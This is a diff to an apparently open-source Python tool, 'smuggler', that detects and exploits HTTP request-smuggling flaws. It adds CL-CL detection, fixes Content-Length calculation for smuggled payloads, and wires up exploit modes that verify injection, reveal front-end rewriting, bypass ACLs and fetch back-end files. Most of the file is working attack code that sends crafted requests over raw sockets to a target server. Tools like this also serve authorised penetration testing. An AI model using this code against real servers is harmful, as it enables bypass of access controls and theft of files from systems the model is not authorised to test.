@@ -9,8 +9,8 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, socket, ssl
 
-VERSION = "v:0.2b"
-RELEASE = "27042020"
+VERSION = "v:0.3beta"
+RELEASE = "28042020"
 SOURCE1 = "https://code.03c8.net/epsylon/smuggler"
 SOURCE2 = "https://github.com/epsylon/smuggler"
 CONTACT = "epsylon@riseup.net - (https://03c8.net)"
@@ -67,7 +67,7 @@ def detect(final): # detect menu
         print("="*50)
         print("Trying payload: ["+str(attack_type)+"]")
         print("="*50+"\n")
-        payload = method+" "+path+" HTTP/1.1\r\nHost: "+target+"\r\n"+payload_type
+        payload = method+" "+path+" HTTP/1.1\r\nHost: "+target+"\r\n"+payload_type # main smuggling payload
         print("+ PAYLOAD:\n")
         print(payload)
         send_payload(attack_type, payload, addr, SSL) # send each payload
@@ -107,14 +107,17 @@ def send_payload(attack_type, payload, addr, SSL):
             data = s.recv(1024)
         if not data:        
             break
-        datas += str(data.decode('utf-8'))
+        try:
+            datas += str(data.decode('utf-8'))
+        except:
+            pass
     print("\n+ REPLY:\n")
     print(str(datas))
     resp_c=0
     resp=""
     wait=False
     for line in datas.split('\n'):
-        if "502" in line or "404" in line or "405" in line:
+        if "502" in line or "501" in line or "404" in line or "405" in line:
             wait=False
             resp_c+=1
         else:
@@ -122,7 +125,7 @@ def send_payload(attack_type, payload, addr, SSL):
         if not wait:
             resp += line+'\n'
     print("-"*45)
-    if resp_c > 0:
+    if resp_c > 0 and "not supported for current URL" in str(datas):
         print ("PAYLOAD: ["+str(attack_type)+"] is WORKING! ;-)")
         VULNERABLE_LIST.append(attack_type) # add attack type for results
     else:
@@ -142,6 +145,7 @@ def show_final_results(target, port, method, path, final):
     TETE = False
     TECL = False
     CLTE = False
+    CLCL = False
     if VULNERABLE_LIST: 
         print("\n  - STATUS: [ VULNERABLE !!! ]\n")
         for v in VULNERABLE_LIST: # resume vulnerable payloads found
@@ -149,13 +153,14 @@ def show_final_results(target, port, method, path, final):
                 print("    * [TE-TE]: [Front-end: Transfer-Encoding] <-> [Back-end: Transfer-Encoding]")
                 TETE = True
             elif v.startswith("TE-CL") and TECL == False: # TE-CL
-                print("    * [TE-CL]: [Front-end: Transfer-Encoding] <-> [Back-end: Content Length]")
+                print("    * [TE-CL]: [Front-end: Transfer-Encoding] <-> [Back-end: Content-Length]")
                 TECL = True
             elif v.startswith("CL-TE") and CLTE == False: # CL-TE
                 print("    * [CL-TE]: [Front-end: Content-Length] <-> [Back-end: Transfer-Encoding]")
                 CLTE = True
             else:
-                pass
+                print("    * [CL-CL]: [Front-end: Content-Length] <-> [Back-end: Content-Length]")
+                CLCL = True
     else:
         print("\n  - STATUS: [ NOT VULNERABLE ]")
         print("\n"+"="*50+"\n")
@@ -165,7 +170,7 @@ def show_final_results(target, port, method, path, final):
     print("\n"+"="*50+"\n")
 
 def exploit(): # exploit menu
-    exploit = input("\n+ SELECT EXPLOIT:\n\n  (0) Verify Reading (Back-End)\n  (1) Reveal Rewriting (Front-End)\n  (2) Bypass ACLs (Front-End)\n  (3) Fetch Files (Back-End)\n\n")
+    exploit = input("\n+ SELECT EXPLOIT:\n\n  (0) Verify Injection (Back-End)\n  (1) Reveal Rewriting (Front-End)\n  (2) Bypass ACLs (Front-End)\n  (3) Fetch Files (Back-End)\n\n")
     if exploit == "0": # verify acccess (back-end)
         exploit_verify()
     elif exploit == "1": # reveal (front-end)
@@ -178,7 +183,7 @@ def exploit(): # exploit menu
         print ("[Info] Not any valid exploit selected... -> [EXITING!]\n")
         sys.exit()
 
-def send_exploit(addr, SSL, exploit):
+def send_exploit(addr, SSL, exploit, exploit_type):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if SSL == True: # ssl
         ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
@@ -208,9 +213,19 @@ def send_exploit(addr, SSL, exploit):
             data = s.recv(1024)
         if not data:
             break
-        datas += str(data.decode('utf-8'))
+        try:
+            datas += str(data.decode('utf-8'))
+        except:
+            pass
     print("\n+ REPLY:\n")
     print(str(datas))
+    if exploit_type == "VERIFY":
+        print("\n"+"-"*45)
+        print("\n[Info] Congratulations!!! ;-)\n\n Your 'chunked' requests have arrived correctly: \n")
+        if "YPOST  not supported for current URL" in str(datas):
+            print("  -> Invalid HTTP method: 'YPOST' (not supported)\n")
+        elif "YGET  not supported for current URL" in str(datas):
+            print("  -> Invalid HTTP method: 'YGET' (not supported)\n")
 
 def exploit_verify():
     print("\n"+"="*50 + "\n")
@@ -228,18 +243,18 @@ def exploit_verify():
                         s = s.replace("$method", method)
                         s = s.replace("$path", path)
                         s = s.replace("$target", target)
-                        smuggled = s.split("#")[1]
+                        smuggled = s.split("#")[1].replace("\n","")
                 exploit = exp.split("#")[1]
                 exploit = exploit.replace("$method", method)
                 exploit = exploit.replace("$path", path)
                 exploit = exploit.replace("$target", target)
-                content_length = 5
+                content_length = len(smuggled)-1
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
                 print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit) # send expoit
+                send_exploit(addr, SSL, exploit, "VERIFY") # send expoit
 
 def exploit_reveal():
     print("\n"+"="*50 + "\n")
@@ -267,13 +282,13 @@ def exploit_reveal():
                 exploit = exploit.replace("$path", path)
                 exploit = exploit.replace("$target", target)
                 exploit = exploit.replace("$parameter", parameter)
-                content_length = 5
+                content_length = len(smuggled)
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
                 print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit) # send expoit
+                send_exploit(addr, SSL, exploit, "REVEAL") # send expoit
 
 def exploit_bypass():
     print("\n"+"="*50 + "\n")
@@ -301,13 +316,13 @@ def exploit_bypass():
                 exploit = exploit.replace("$path", path)
                 exploit = exploit.replace("$target", target)
                 exploit = exploit.replace("$restricted", restricted)
-                content_length = 110 + len(restricted) # $template CL exploit + user path
+                content_length = len(smuggled)
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
                 print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit) # send expoit
+                send_exploit(addr, SSL, exploit, "BYPASS") # send expoit
 
 def exploit_steal():
     print("\n"+"="*50 + "\n")
@@ -335,13 +350,13 @@ def exploit_steal():
                 exploit = exploit.replace("$path", path)
                 exploit = exploit.replace("$target", target)
                 exploit = exploit.replace("$files", files)
-                content_length = 1
+                content_length = len(smuggled)
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
                 print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit) # send expoit
+                send_exploit(addr, SSL, exploit, "STEAL") # send expoit
 
 def print_banner():
     print("\n"+"="*50)
